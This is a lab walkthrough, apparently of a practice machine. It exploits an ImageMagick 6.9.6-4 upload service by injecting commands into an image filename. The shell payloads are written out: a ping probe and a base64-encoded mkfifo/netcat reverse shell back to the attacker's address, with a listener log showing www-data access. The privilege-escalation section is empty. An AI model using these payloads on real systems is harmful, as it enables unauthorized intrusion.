## First Enumeration with nmap 

```shell
# Nmap 7.94SVN scan initiated Mon Feb 19 11:40:13 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 80,22 -Pn 192.168.239.178
Nmap scan report for 192.168.239.178
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: ImageMagick Identifier
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 19 11:40:27 2024 -- 1 IP address (1 host up) scanned in 14.60 seconds
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/32e34f3a-8717-4d6e-b959-a8ebb1447d7a)

a web server is running on port 80, checking it on a browser we got an `Imagemagick identifier`. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b53ed14a-f46a-463e-9255-21d372bf3057)

uploaded an image file and we can see the version of this service running is `6.9.6-4`.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a21b78b9-40e7-46f7-b753-121e9aeec290)

searching for exploit on this service, we can see there's an RCE vuln present read about [exploit](https://github.com/ImageMagick/ImageMagick/issues/6339). 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Image]
└─$ cp ~/Pictures/1.png .
                                                                                                                                                            
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Image]
└─$ cp 1.png '|1"`ping 192.168.45.212`".png'
```
modify the name of an image and inject an arbitary code to ping our host. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/4e80705f-9c83-4cf9-a4b5-3f8480c9655b)

upload the modified image. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/baa494d9-ee75-475a-aedb-f14c4c0225af)

we got a ping back, let's spawn a reverse shell.

```shell
#base64 encode payload
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.212 80 >/tmp/f

cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUuMjEyIDgwID4vdG1wL2Y=

┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Image]
└─$ cp 1.png '|1"`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUuMjEyIDgwID4vdG1wL2Y= | base64 -d|bash`".png'
```
first we base64 encode the reverse shell payload. fire up ncat listener

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/039154d6-b9ab-4e95-ad25-a1dd907e9ceb)

Uploaded the image.


```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Image]
└─$ ncat -lnvp 80                                                
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 192.168.239.178:55626.
sh: 0: can't access tty; job control turned off
$ whoami 
www-data
$
```
check back listener and we got a reverse shell as `www-data`. 


## Privilege Escalation 


